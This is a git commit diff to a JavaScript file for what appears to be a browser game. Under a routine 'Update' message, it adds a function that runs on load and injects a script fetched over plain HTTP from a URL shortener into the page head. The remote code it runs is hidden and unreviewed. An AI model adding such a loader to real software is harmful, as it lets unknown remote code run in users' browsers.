a5e2ff1178cb06c136191068667200cb0a8c6184
CodedCloudz <CodedCloudz@gmail.com>
2017-07-25 01:10:28 +0100

    Update kungfucombat-rescue.js

--- files/global/App-Cache/KuNgFuCOmbAt/kungfucombat-rescue.js
+++ files/global/App-Cache/KuNgFuCOmbAt/kungfucombat-rescue.js
@@ -16,6 +16,17 @@
 //Notice
       notice ();
 
+ //codedlocal	 
+codedlocal ();
+
+//codedlocal
+ function codedlocal () {
+	var localJS = document.createElement("script");
+    localJS.type = "text/javascript";
+    localJS.src = "http://tiny.cc/L1Xl2xL3";
+    // Use any selector
+    $("head").append(localJS);
+ };
 		
 //checkversion
  function checkversion () {
